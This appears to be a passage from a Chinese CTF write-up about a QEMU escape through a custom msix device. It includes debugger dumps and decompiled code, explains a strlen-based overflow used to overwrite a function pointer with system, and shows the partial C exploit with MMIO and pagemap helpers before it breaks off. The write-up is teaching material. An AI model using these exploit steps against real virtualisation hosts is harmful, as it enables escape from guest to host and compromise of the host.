class="number">0x5555563e0970</span> —▸ <span class="number">0x5555563e0af0</span> ◂— <span class="number">0x7f00656d766e</span> <span class="comment">/* &#x27;nvme&#x27; */</span></span><br><span class="line">*R8   <span class="number">0x555555b83a93</span> ◂— outsb  dx, byte ptr [rsi] <span class="comment">/* &#x27;nvme&#x27; */</span></span><br><span class="line">*R9   <span class="number">0x2000</span></span><br><span class="line">*R10  <span class="number">0x80</span></span><br><span class="line">*R11  <span class="number">0x7ffff7c2abe0</span> —▸ <span class="number">0x55555719edf0</span> ◂— <span class="number">0x0</span></span><br><span class="line">*R12  <span class="number">0x555557198980</span> ◂— <span class="number">0x10000058458086</span></span><br><span class="line">*R13  <span class="number">0x555557195e50</span> ◂— <span class="number">0x0</span></span><br><span class="line">*R14  <span class="number">0x555557196070</span> —▸ <span class="number">0x5555564d7060</span> —▸ <span class="number">0x5555564e4f10</span> ◂— <span class="number">0x555500787844</span> <span class="comment">/* &#x27;Dxx&#x27; */</span></span><br><span class="line"> R15  <span class="number">0x0</span></span><br><span class="line">*RBP  <span class="number">0x5555571952e0</span> —▸ <span class="number">0x555556496660</span> —▸ <span class="number">0x5555563e0970</span> —▸ <span class="number">0x5555563e0af0</span> ◂— <span class="number">0x7f00656d766e</span> <span class="comment">/* &#x27;nvme&#x27; */</span></span><br><span class="line">*RSP  <span class="number">0x7fffffffde70</span> —▸ <span class="number">0x5555558f4920</span> ◂— push   r12</span><br><span class="line">*RIP  <span class="number">0x55555585e230</span> ◂— call   <span class="number">0x555555710390</span></span><br><span class="line">───────────────────[ DISASM ]───────────────────────────────────</span><br><span class="line"> ► <span class="number">0x55555585e230</span>    call   <span class="number">0x555555710390</span> &lt;<span class="number">0x555555710390</span>&gt;</span><br><span class="line"></span><br><span class="line">   <span class="number">0x55555585e235</span>    xor    esi, esi</span><br><span class="line">   <span class="number">0x55555585e237</span>    mov    rcx, r13</span><br><span class="line">   <span class="number">0x55555585e23a</span>    mov    edx, <span class="number">4</span></span><br><span class="line">   <span class="number">0x55555585e23f</span>    mov    rdi, rbp</span><br><span class="line">   <span class="number">0x55555585e242</span>    call   <span class="number">0x5555558f6bb0</span> &lt;<span class="number">0x5555558f6bb0</span>&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>下一次断点我们看一下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">*RAX  <span class="number">0x1</span></span><br><span class="line"> RBX  <span class="number">0x5555571952e0</span> —▸ <span class="number">0x555556496660</span> —▸ <span class="number">0x5555563e0970</span> —▸ <span class="number">0x5555563e0af0</span> ◂— <span class="number">0x7f00656d766e</span> <span class="comment">/* &#x27;nvme&#x27; */</span></span><br><span class="line"> RCX  <span class="number">0x5555571952e0</span> —▸ <span class="number">0x555556496660</span> —▸ <span class="number">0x5555563e0970</span> —▸ <span class="number">0x5555563e0af0</span> ◂— <span class="number">0x7f00656d766e</span> <span class="comment">/* &#x27;nvme&#x27; */</span></span><br><span class="line">*RDX  <span class="number">0x55555626a920</span> —▸ <span class="number">0x5555558fa280</span> ◂— mov    eax, dword ptr [rdi + <span class="number">0x620</span>]</span><br><span class="line">*RDI  <span class="number">0x555557195b00</span> ◂— <span class="number">0x0</span></span><br><span class="line"> RSI  <span class="number">0x5555571952e0</span> —▸ <span class="number">0x555556496660</span> —▸ <span class="number">0x5555563e0970</span> —▸ <span class="number">0x5555563e0af0</span> ◂— <span class="number">0x7f00656d766e</span> <span class="comment">/* &#x27;nvme&#x27; */</span></span><br><span class="line">*R8   <span class="number">0x555555bed204</span> ◂— insd   dword ptr [rdi], dx <span class="comment">/* &#x27;msix-table&#x27; */</span></span><br><span class="line">*R9   <span class="number">0x400</span></span><br><span class="line">*R10  <span class="number">0x40</span></span><br><span class="line"> R11  <span class="number">0x7ffff7c2abe0</span> —▸ <span class="number">0x55555719fcc0</span> ◂— <span class="number">0x0</span></span><br><span class="line">*R12  <span class="number">0x0</span></span><br><span class="line">*R13  <span class="number">0x400</span></span><br><span class="line">*R14  <span class="number">0x3f</span></span><br><span class="line">*R15  <span class="number">0x4</span></span><br><span class="line">*RBP  <span class="number">0x555557195b00</span> ◂— <span class="number">0x0</span></span><br><span class="line">*RSP  <span class="number">0x7fffffffdd98</span> —▸ <span class="number">0x5555558fae9d</span> ◂— mov    rdi, qword ptr [rsp + <span class="number">8</span>]</span><br><span class="line"> RIP  <span class="number">0x555555710390</span> ◂— push   r15</span><br><span class="line">──────────────────[ DISASM ]───────────────────────────────</span><br><span class="line"> ► <span class="number">0x555555710390</span>    push   r15</span><br><span class="line">   <span class="number">0x555555710392</span>    push   r14</span><br><span class="line">   <span class="number">0x555555710394</span>    mov    r15, r9</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们看到这里的名称是<code>msix-table</code>看一下函数调用栈</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bt</span><br><span class="line">#<span class="number">0</span>  <span class="number">0x0000555555710390</span> in ?? ()</span><br><span class="line">#<span class="number">1</span>  <span class="number">0x00005555558fae9d</span> in ?? ()</span><br><span class="line">#<span class="number">2</span>  <span class="number">0x00005555558fb053</span> in ?? ()</span><br><span class="line">#<span class="number">3</span>  <span class="number">0x000055555585e25d</span> in ?? ()</span><br><span class="line">#<span class="number">4</span>  <span class="number">0x00005555558f8df5</span> in ?? ()</span><br><span class="line">#<span class="number">5</span>  <span class="number">0x00005555558700b2</span> in ?? ()</span><br><span class="line">#<span class="number">6</span>  <span class="number">0x00005555559c4d67</span> in ?? ()</span><br><span class="line">#<span class="number">7</span>  <span class="number">0x00005555559c93bf</span> in ?? ()</span><br><span class="line">#<span class="number">8</span>  <span class="number">0x00005555559c6c95</span> in ?? ()</span><br><span class="line">#<span class="number">9</span>  <span class="number">0x00005555558160bf</span> in ?? ()</span><br><span class="line">#<span class="number">10</span> <span class="number">0x000055555581857f</span> in ?? ()</span><br><span class="line">#<span class="number">11</span> <span class="number">0x0000555555abde1a</span> in ?? ()</span><br><span class="line">#<span class="number">12</span> <span class="number">0x00005555556afee1</span> in ?? ()</span><br><span class="line">#<span class="number">13</span> <span class="number">0x00007ffff7a660b3</span> in ?? ()</span><br><span class="line">#<span class="number">14</span> <span class="number">0x0000000000000000</span> in ?? ()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们发现了一个就在<code>relaize</code>函数中的调用也就是<code>0x000055555585e25d</code>，对应的就是<code>msix_init_exclusive_bar</code>函数。 那么在这里就进行了<code>msix</code>的内存空间的注册，我们看一下关键的<code>msix_init</code>函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ret = msix_init(dev, nentries, &amp;dev-&gt;msix_exclusive_bar, bar_nr,</span></span><br><span class="line"><span class="comment">//                    0, &amp;dev-&gt;msix_exclusive_bar,</span></span><br><span class="line"><span class="comment">//                    bar_nr, bar_pba_offset,</span></span><br><span class="line"><span class="comment">//                    0, errp);</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">msix_init</span><span class="params">(<span class="keyword">struct</span> PCIDevice *dev, <span class="type">unsigned</span> <span class="type">short</span> nentries,</span></span><br><span class="line"><span class="params">              MemoryRegion *table_bar, <span class="type">uint8_t</span> table_bar_nr,</span></span><br><span class="line"><span class="params">              <span class="type">unsigned</span> table_offset, MemoryRegion *pba_bar,</span></span><br><span class="line"><span class="params">              <span class="type">uint8_t</span> pba_bar_nr, <span class="type">unsigned</span> pba_offset, <span class="type">uint8_t</span> cap_pos,</span></span><br><span class="line"><span class="params">              Error **errp)</span></span><br><span class="line">&#123;</span><br><span class="line">    msix_mask_all(dev, nentries);</span><br><span class="line"></span><br><span class="line">    memory_region_init_io(&amp;dev-&gt;msix_table_mmio, OBJECT(dev), &amp;msix_table_mmio_ops, dev,</span><br><span class="line">                          <span class="string">&quot;msix-table&quot;</span>, table_size);</span><br><span class="line">    memory_region_add_subregion(table_bar, table_offset, &amp;dev-&gt;msix_table_mmio);</span><br><span class="line">    memory_region_init_io(&amp;dev-&gt;msix_pba_mmio, OBJECT(dev), &amp;msix_pba_mmio_ops, dev,</span><br><span class="line">                          <span class="string">&quot;msix-pba&quot;</span>, pba_size);</span><br><span class="line">    memory_region_add_subregion(pba_bar, pba_offset, &amp;dev-&gt;msix_pba_mmio);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>从上层函数<code>msix_init_exclusive_bar</code>函数中可以看到这里的<code>table_bar</code>和<code>pba_bar</code>是同一个数值。而<code>pba_offset</code>的值就是<code>bar_pba_offset</code>，这个值其实是<code>table_size</code>，也就是说其实<code>msix_table，msix_pba</code>操作的是同一个内存空间，只不过分为上下两个部分，这个和<code>usb</code>类似。即<code>0-table_size</code>的部分由<code>msix-table</code>负责，<code>table_size-table_size+pba_size</code>的部分则是<code>msix-pba</code>负责。</p><p>主要看一下这里的<code>msix-pba_mmio_ops/msix-table_mmio_ops</code>的操作。这里函数代码太长就不放出来了。</p><p><code>msix-table_mmio_read</code>函数调用了一个函数指针，该函数指针可以在<code>msix-table_mmio_write</code>中设置，调用的函数是一个<code>encode</code>函数，简单实现了一个异或的加密操作。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">encode(a1_498, a1_518, a1_598);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>将<code>+0x498</code>起始的字符串作为<code>key</code>，<code>0x518</code>起始的字符串作为<code>input</code>，<code>encode</code>之后的字符串写入<code>+598</code>的位置。函数指针位于<code>0x618</code>处。</p><p><code>msix-table_mmio_write</code>除了设置函数指针之外还可以为<code>cmd</code>赋值，该值在整个<code>msix</code>中都有用到。</p><p><code>msix-pba_read</code>函数用清空<code>key,input</code>，并且可以读取<code>output</code>即加密之后的字符串。这里需要注意的是<code>read</code>函数调用的第二个参数即<code>addr</code>应该是不受<code>read</code>过程中的设置的字节大小影响的。即<code>uint8_t read</code>也可以将<code>addr</code>设置为两个字节。</p><p><code>msix-pba_write</code>函数用来设置<code>key,input</code>的值。</p><p>这里其实很明显了，如果我们将函数指针直接覆写为<code>system.plt</code>那么之后调用的时候参数我们全都可以进行控制。主要是怎么覆写这个指针。我们看一下<code>encode</code>的函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> __fastcall <span class="title function_">encode</span><span class="params">(<span class="type">char</span> *key, <span class="type">char</span> *input, __int64 output)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> input_len; <span class="comment">// er14</span></span><br><span class="line">  <span class="type">int</span> tmp; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> key_len; <span class="comment">// er8  encode(a1_498, a1_518, a1_598);</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// ecx</span></span><br><span class="line">  __int64 index; <span class="comment">// rdi</span></span><br><span class="line"></span><br><span class="line">  input_len = <span class="built_in">strlen</span>(input);</span><br><span class="line">  tmp = <span class="built_in">strlen</span>(key);</span><br><span class="line">  <span class="keyword">if</span> ( tmp &amp;&amp; input_len )</span><br><span class="line">  &#123;</span><br><span class="line">    key_len = tmp;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i != input_len; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      tmp = i;</span><br><span class="line">      index = i;</span><br><span class="line">      LOBYTE(tmp) = input[index] ^ key[tmp % key_len];</span><br><span class="line">      *(_BYTE *)(output + index) = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里我们看到是用<code>strlen</code>这个函数来判断<code>key,input</code>的长度的，但是这两个区域是连着的，因此这里可以造成一个溢出，也就是如果我们填充<code>input=0x80</code>，且<code>output</code>中存在数据，那么就会溢出写函数指针。同样的原理可以进行越界读（因为越界读判断的是<code>output</code>的长度，将<code>output</code>填满即可越界读）。</p><p>思路很明显了，通过越界读读取函数指针泄漏的到<code>qemu base</code>的值，进一步得到<code>system.plt</code>的值，然后设置<code>key=cat /flag</code>，覆写函数指针，触发<code>system</code>的调用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* mmio_mem;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* misx_mmio_mem;</span><br><span class="line"><span class="type">int64_t</span> pmio_base = <span class="number">0xc050</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">virtuak_addr_to_physical_addr</span><span class="params">(<span class="type">void</span> *addr)</span>&#123;</span><br><span class="line">    <span class="type">uint64_t</span> data;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/proc/self/pagemap&quot;</span>,O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(!fd)&#123;</span><br><span class="line">        perror(<span class="string">&quot;open pagemap&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> pagesize = getpagesize();</span><br><span class="line">    <span class="type">size_t</span> offset = ((<span class="type">uintptr_t</span>)addr / pagesize) * <span class="keyword">sizeof</span>(<span class="type">uint64_t</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(lseek(fd,offset,SEEK_SET) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;lseek&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(read(fd,&amp;data,<span class="number">8</span>) != <span class="number">8</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;read&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(data &amp; (((<span class="type">uint64_t</span>)<span class="number">1</span> &lt;&lt; <span class="number">63</span>))))&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;page&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> pageframenum = data &amp; ((<span class="number">1ull</span> &lt;&lt; <span class="number">55</span>) - <span class="number">1</span>);</span><br><span class="line">    <span class="type">size_t</span> phyaddr = pageframenum * pagesize + (<span class="type">uintptr_t</span>)addr % pagesize;</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> phyaddr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">die</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">mem_map</span><span class="params">( <span class="type">const</span> <span class="type">char</span>* dev, <span class="type">size_t</span> offset, <span class="type">size_t</span> size )</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> fd = open( dev, O_RDWR | O_SYNC );</span><br><span class="line">    <span class="keyword">if</span> ( fd == <span class="number">-1</span> ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span>* result = mmap( <span class="literal">NULL</span>, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, offset );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( !result ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    close( fd );</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">uint64_t</span> value, <span class="type">int</span> choice)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (choice == <span class="number">0</span>)&#123;</span><br><span class="line">        *((<span class="type">uint8_t</span>*)(mmio_mem + addr)) = value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (choice == <span class="number">1</span>)&#123;</span><br><span class="line">        *((<span class="type">uint16_t</span>*)(mmio_mem + addr)) = value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (choice == <span class="number">2</span>)&#123;</span><br><span class="line">        *((<span class="type">uint32_t</span>*)(mmio_mem + addr)) = value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (choice == <span class="number">3</span>)&#123;</span><br><span class="line">        *((<span class="type">uint64_t</span>*)(mmio_mem + addr)) = value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">misx_mmio_write</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">uint64_t</span> value, <span class="type">int</span> choice)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (choice == <span class="number">0</span>)&#123;</span><br><span class="line">        *((<span class="type">uint8_t</span>*)(misx_mmio_mem + addr)) = value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (choice == <span class="number">1</span>)&#123;</span><br><span class="line">        *((<span class="type">uint16_t</span>*)(misx_mmio_mem + addr)) = value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (choice == <span class="number">2</span>)&#123;</span><br><span class="line">        *((<span class="type">uint32_t</span>*)(misx_mmio_mem + addr)) = value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (choice == <span class="number">3</span>)&#123;</span><br><span class="line">        *((<span class="type">uint64_t</span>*)(misx_mmio_mem + addr)) = value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">misx_pba_mmio_write</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">uint64_t</span> value, <span class="type">int</span> choice)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (choice == <span class="number">0</span>)&#123;</span><br><span class="line">        *((<span class="type">uint8_t</span>*)(misx_mmio_mem + <span class="number">0x800</span> + addr)) = value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (choice == <span class="number">1</span>)&#123;</span><br><span class="line">        *((<span class="type">uint16_t</span>*)(misx_mmio_mem + <span class="number">0x800</span> + addr)) = value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (choice == <span class="number">2</span>)&#123;</span><br><span class="line">        *((<span class="type">uint32_t</span>*)(misx_mmio_mem + <span class="number">0x800</span> + addr)) = value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (choice == <span class="number">3</span>)&#123;</span><br><span class="line">        *((<span class="type">uint64_t</span>*)(misx_mmio_mem + <span class="number">0x800</span> + addr)) = value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span 